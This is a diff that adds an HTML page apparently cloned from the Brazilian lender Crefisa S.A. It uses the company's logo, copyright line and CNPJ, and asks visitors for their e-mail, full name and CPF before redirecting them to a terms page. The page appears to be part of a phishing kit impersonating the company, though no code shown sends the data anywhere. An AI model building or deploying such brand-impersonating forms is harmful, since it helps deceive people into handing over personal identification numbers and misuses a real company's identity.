@@ -1,0 +1,196 @@
+﻿<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <link href="npm/bootstrap%405.3.0/dist/css/bootstrap.min-2.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <style>
+        /* Suas estilizações existentes */
+        .header {
+            background: white;
+            color: white;
+            padding: 15px 0;
+            text-align: center;
+            font-size: 1.5rem;
+            font-weight: bold;
+            grid-area: top-bar;
+        }
+
+        .main-content {
+            max-width: 450px;
+            background-color: white;
+            text-align: center;
+            padding: 2rem 2rem 1rem 2rem;
+            border-radius: 10px;
+            box-shadow: 0 2px 40px rgba(0, 0, 0, 0.1);
+            margin: 0 auto;
+        }
+
+        .main-content h2 {
+            margin-bottom: 20px;
+        }
+
+        .btn-custom {
+            color: white;
+            border: none;
+            width: 100%;
+            margin-bottom: 10px;
+            background: #38C0E5;
+            font-weight: 600;
+            border-radius: 1rem;
+            padding: .75rem 3rem;
+            letter-spacing: .3px;
+            line-height: 1.15;
+        }
+
+        .btn-custom:hover {
+            color: black !important;
+            background-color: #38C0E5 !important;
+            transform: scale(1.02) !important;
+        }
+
+        .footer {
+            background-color: #ffffff;
+            border-top: solid 1px #e6dddd;
+            color: #000;
+            text-align: center;
+            width: 100%;
+            bottom: 0;
+            grid-area: footer;
+            border-bottom: solid 3px #e6007e;
+            padding: 2rem 0.5rem;
+            position: relative;
+            margin-top: 50px;
+        }
+
+        #conclusao {
+            display: none;
+        }
+
+        #conclusao h4 {
+            color: green;
+            font-weight: bold;
+        }
+
+        .char {
+            border-top: solid px #00adca;
+            background-color: #00adca;
+            padding: 2px !important;
+        }
+
+        /* End custom CSS */
+    </style>
+</head>
+
+<body>
+    <div style="
+  display: grid;
+  grid-template-areas:
+    'top-bar'
+    'content'
+    'footer';
+  grid-template-rows: auto 1fr auto;
+  min-height: 100vh;
+">
+        <div class="header">
+            <img decoding="async" style="width: 120px;" src="wikipedia/pt/a/a3/Crefisa-4.png" alt="Imagem Centralizada">
+        </div>
+
+        <div style="grid-area: content; padding: 0 1rem;">
+            <div style="margin-top: 18px;" class="main-content">
+                <div id="formulario" class="mb-3">
+                    <p style="color:gray; text-align:initial">Preencha os campos abaixo</p>
+                    <form id="cadastroForm" style="text-align:initial" onsubmit="return validarFormulario(event)">
+
+                        <div class="mb-3">
+                            <label for="email" class="form-label" style="color:gray; font-size:13px">E-mail</label>
+                            <input type="text" class="form-control" id="email" placeholder="email@email.com">
+                            <small id="emailError" style="color: red; display: none;">E-mail inválido.</small>
+                        </div>
+
+                        <div class="mb-3">
+                            <label for="nome" class="form-label" style="color:gray; font-size:13px">Nome
+                                completo</label>
+                            <input type="text" class="form-control" id="nome" placeholder="Ex: Maria">
+                            <small id="nomeError" style="color: red; display: none;">Nome é obrigatório.</small>
+                        </div>
+
+                        <div class="mb-3">
+                            <label for="cpf" class="form-label" style="color:gray; font-size:13px">CPF</label>
+                            <input type="text" class="form-control" id="cpfInput" placeholder="000.000.000-00"
+                                oninput="validarCPF()">
+                            <small id="cpfError" style="color: red; display: none;">CPF inválido.</small>
+                        </div>
+
+                        <div id="loader" style="display: none; text-align: center; margin-bottom: 15px;">
+                            <i class="fas fa-spinner fa-spin" style="font-size: 2em; color: #FE9005;"></i>
+                        </div>
+
+                        <button class="btn-custom" type="submit">Continuar</button>
+                    </form>
+
+                    <script>
+                        function validarFormulario(event) {
+                            event.preventDefault(); // Evita o envio do formulário
+
+                            let isValid = true;
+
+                            // Validação do e-mail
+                            const email = document.getElementById("email").value;
+                            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                            if (!emailRegex.test(email)) {
+                                document.getElementById("emailError").style.display = "block";
+                                isValid = false;
+                            } else {
+                                document.getElementById("emailError").style.display = "none";
+                            }
+
+                            // Validação do nome
+                            const nome = document.getElementById("nome").value;
+                            if (nome.trim() === "") {
+                                document.getElementById("nomeError").style.display = "block";
+                                isValid = false;
+                            } else {
+                                document.getElementById("nomeError").style.display = "none";
+                            }
+
+                            // Validação do CPF
+                            if (!validarCPF()) {
+                                isValid = false;
+                            }
+
+                            if (isValid) {
+                                // Mostrar loader
+                                document.getElementById("loader").style.display = "block";
+                                // Simular carregamento
+                                window.location.href = "/termos.html"; // Simula redirecionamento
+                            }
+                        }
+
+                        function validarCPF() {
+                            const cpf = document.getElementById("cpfInput").value; // Usando o novo ID
+                            const cpfSemFormatacao = cpf.replace(/\D/g, ''); // Remove qualquer caractere não numérico
+
+                            // O CPF deve ter 11 dígitos
+                            if (cpfSemFormatacao.length !== 11) {
+                                document.getElementById("cpfError").style.display = "block";
+                                return false;
+                            } else {
+                                document.getElementById("cpfError").style.display = "none";
+                                return true;
+                            }
+                        }
+
+                    </script>
+                </div>
+            </div>
+        </div>
+        <div class="footer py-4" id="footerChg">
+            © 2024 CREFISA S.A. CNPJ: 60.779.196/0001-96 <br>
+            Todos os direitos reservados
+        </div>
+    </div>
+</body>
+
+</html>
